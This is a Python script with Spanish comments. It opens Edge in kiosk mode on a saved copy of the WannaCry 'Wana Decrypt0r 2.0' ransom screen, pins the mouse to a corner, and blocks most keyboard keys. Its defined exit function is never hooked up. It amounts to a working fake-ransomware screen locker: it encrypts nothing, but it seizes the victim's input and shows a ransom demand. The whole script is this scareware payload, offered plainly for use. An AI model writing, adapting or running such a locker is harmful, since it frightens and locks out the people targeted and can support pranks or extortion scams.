import subprocess
import keyboard
import ctypes
import threading
import time
import sys

# ----------------------------
# CONFIGURACIÓN
# ----------------------------
EDGE = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
HTML = r"C:\Users\elvir\Documents\Wana Decrypt0r 2.0_files\Wana Decrypt0r 2.0.html"

# ----------------------------
# ABRIR EDGE EN MODO KIOSCO
# ----------------------------
subprocess.Popen([
    EDGE,
    "--kiosk",
    f"file:///{HTML}",
    "--edge-kiosk-type=fullscreen",
    "--no-first-run",
    "--disable-infobars"
])

time.sleep(1)

# ----------------------------
# BLOQUEAR RATÓN
# ----------------------------
def bloquear_raton():
    while True:
        ctypes.windll.user32.SetCursorPos(0, 0)
        time.sleep(0.01)

threading.Thread(target=bloquear_raton, daemon=True).start()

# ----------------------------
# BLOQUEAR TECLAS (TU LISTA)
# ----------------------------

# Números
for k in "0123456789":
    keyboard.block_key(k)

# Símbolos
for k in ['-','=', '[',']','\\',';',"'",',','.','/','`']:
    keyboard.block_key(k)

# Control
for k in ['enter','backspace','tab','space','esc']:
    keyboard.block_key(k)

# Flechas
for k in ['up','down','left','right']:
    keyboard.block_key(k)

# Navegación
for k in ['insert','delete','home','end','page up','page down']:
    keyboard.block_key(k)

# Modificadores
for k in [
    'shift','left shift','right shift',
    'ctrl','left ctrl','right ctrl',
    'alt','left alt','right alt',
    'caps lock','num lock','scroll lock'
]:
    keyboard.block_key(k)

# Sistema
for k in ['windows','left windows','right windows','menu']:
    keyboard.block_key(k)

# Funciones
for i in range(1,13):
    keyboard.block_key(f'f{i}')

# NumPad
for k in [
    'num 0','num 1','num 2','num 3','num 4',
    'num 5','num 6','num 7','num 8','num 9',
    'num +','num -','num *','num /','num .','num enter'
]:
    keyboard.block_key(k)

# Multimedia
for k in [
    'volume up','volume down','volume mute',
    'play/pause','next track','previous track'
]:
    keyboard.block_key(k)

# ----------------------------
# SALIDA DE EMERGENCIA
# ----------------------------
def salir():
    keyboard.unhook_all()
    sys.exit()
# ----------------------------
# MANTENER ACTIVO
# ----------------------------
while True:
    time.sleep(1)
